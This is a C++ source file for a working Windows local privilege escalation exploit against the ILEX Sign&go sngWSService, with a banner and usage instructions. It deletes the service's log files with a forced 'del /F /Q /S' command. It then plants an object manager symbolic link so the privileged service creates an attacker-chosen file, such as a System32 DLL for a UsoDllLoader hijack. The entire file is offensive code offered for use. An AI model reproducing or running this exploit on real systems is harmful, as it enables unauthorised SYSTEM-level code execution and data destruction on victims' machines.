
//  Author: Ricardo Almeida - ricardojba@protonmail.com
//
//  Based on symboliclink-testing-tools which was developed by James Forshaw (Google Project Zero):
//  https://github.com/googleprojectzero/symboliclink-testing-tools
//  And the CVE-2020-7283 exploit code by RedyOps Research Labs:
//  https://labs.redyops.com/index.php/2020/07/14/mcafee-total-protection-mtp-16-0-r26-escalation-of-privilege-cve-2020-7283/
//  https://github.com/RedyOpsResearchLabs/CVE-2020-7283-McAfee-Total-Protection-MTP-16.0.R26-EoP

#include "stdafx.h"
#include <FileSymlink.h>
#include <ReparsePoint.h>
#include <windows.h>
#include <iostream>
#include <string.h>
#include <sys/stat.h>
#include <Shlwapi.h>

#pragma comment (lib, "shlwapi.lib")

inline bool FileExists(const LPCWSTR& name) {
	struct _stat buf;
	return (_wstat(name, &buf) == 0);
}

int _tmain() {
	PWSTR cmdline = GetCommandLineW();
	int argc;
	PWSTR* argv = CommandLineToArgvW(cmdline, &argc);
	LPCWSTR createFile = argv[1];
	bool retval = false;
	std::cout << R"(
  _____ _      ________   __   _____ _                            ______ __   ______      _____    ______            _       _ _  
 |_   _| |    |  ____\ \ / /  / ____(_)       ___                |____  /_ | |  ____|    |  __ \  |  ____|          | |     (_) |  
   | | | |    | |__   \ V /  | (___  _  __ _ ( _ )   __ _  ___       / / | | | |__   ___ | |__) | | |__  __  ___ __ | | ___  _| |_
   | | | |    |  __|   > <    \___ \| |/ _` |/ _ \/\/ _` |/ _ \     / /  | | |  __| / _ \|  ___/  |  __| \ \/ / '_ \| |/ _ \| | __|
  _| |_| |____| |____ / . \   ____) | | (_| | (_>  < (_| | (_) |   / / _ | | | |____ (_) | |      | |____ >  <| |_) | | (_) | | |_
 |_____|______|______/_/ \_\ |_____/|_|\__, |\___/\/\__, |\___/   /_/ (_)|_| |______\___/|_|      |______/_/\_\ .__/|_|\___/|_|\__|
                                        __/ |        __/ |                                                    | |                  
                                       |___/        |___/                                                     |_|                  

  By Ricardo Almeida - ricardojba@protonmail.com
	)" << '\n';

	if (argc < 2) {
		std::wcout << "\nSpecify a target DLL or File to be created!" << std::endl;
		std::wcout << "\nEx: " << argv[0] << " C:\\Windows\\System32\\WindowsCoreDeviceInfo.dll (UsoDllLoader)\n\n" << std::endl;
		return 1;
	}

	std::wstring logDir = L"C:\\ProgramData\\Ilex\\S&G\\Logs";
	std::wstring sngWSService1_log = L"C:\\ProgramData\\Ilex\\S&G\\Logs\\000-sngWSService1.log";

	std::wcout << "" << std::endl;
	system("del /F /Q /S \"C:\\ProgramData\\Ilex\\S&G\\Logs\\*.*\" ");
	
	if (PathIsDirectoryEmpty(L"C:\\ProgramData\\Ilex\\S&G\\Logs\\")) {
		std::wcout << "\n"<< logDir <<" directory is empty!" << std::endl;
		std::wcout << "\nCreating Object Manager Symbolic Link!" << std::endl;
	} else {
		std::wcout << "\n\"" << logDir << "\" is NOT empty!" << std::endl;
		std::wcout << "Try to delete all log files on \"" << logDir << "\" manually and/or run the exploit again." << std::endl;
		std::wcout << "\nExiting now!\n\n" << std::endl;
		return 0;
	}

	LPCWSTR baseobjdir = nullptr;
	bool permanent = false;
	FileSymlink csv(permanent);
	csv.CreateSymlink(sngWSService1_log.c_str(), createFile, baseobjdir);
	std::wcout << "\nWaiting for sngWSService to create the desired file...\n\n" <<
		"\nNOTE 1: This step can take a while, but you can speed this up by disconnecting the network/internet/VPN and wait for the service\n" <<
		"        to detect that the the network connection is down. After it detects that the connection is down, the service will" <<
		"\n        start writting to the logs almost every second." << 
		"\n        Alternatively you can reboot the machine and execute this exploit offline, right after you login." <<
		"\n\nNOTE 2: The exploit code is targeting the log file \"" << sngWSService1_log << "\"" <<
		"\n        however the S&G service might be writting to one of the logs 000-sngWSService[1-4].log." <<
		"\n        In this case adjust the exploit code, build it and run it again.\n" << std::endl;

	Wow64DisableWow64FsRedirection(NULL);
	do {
		retval = FileExists(createFile);
	} while (retval != true);

	std::wcout << "The file " << createFile << " was created!!!\n\n" << std::endl;
	std::wcout << "Removing the Object Manager Symbolic Link...\n\n" << std::endl;

	if (!ReparsePoint::DeleteMountPoint(logDir)) {
		printf("Error deleting mount point %ls\n", GetErrorMessage().c_str());
		return 1;
	}
	return 0;
}
